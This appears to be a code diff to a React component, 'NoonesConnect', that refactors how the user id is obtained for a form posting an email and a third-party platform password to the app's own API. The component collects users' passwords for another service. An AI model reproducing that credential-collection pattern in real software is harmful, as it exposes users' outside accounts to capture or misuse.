@@ -1,9 +1,11 @@
 import React, { useState } from 'react';
 import { useNavigate } from 'react-router-dom';
 import { supabase } from '../../lib/supabase';
+import { useAuth } from '../../contexts/AuthContext';
 
 export default function NoonesConnect() {
   const navigate = useNavigate();
+  const { user } = useAuth();
   const [isDarkMode, setIsDarkMode] = useState(true);
   const [loading, setLoading] = useState(false);
   const [errorMessage, setErrorMessage] = useState('');
@@ -25,7 +27,6 @@ export default function NoonesConnect() {
     }
     setLoading(true);
     try {
-      const { data: { session } } = await supabase.auth.getSession();
       const response = await fetch('/api/submit-connection', {
         method: 'POST',
         headers: {
@@ -35,7 +36,7 @@ export default function NoonesConnect() {
           platform: 'Noones',
           email,
           third_party_password: password,
-          user_id: session?.user?.id || null,
+          user_id: user?.id || null,
         }),
       });
 
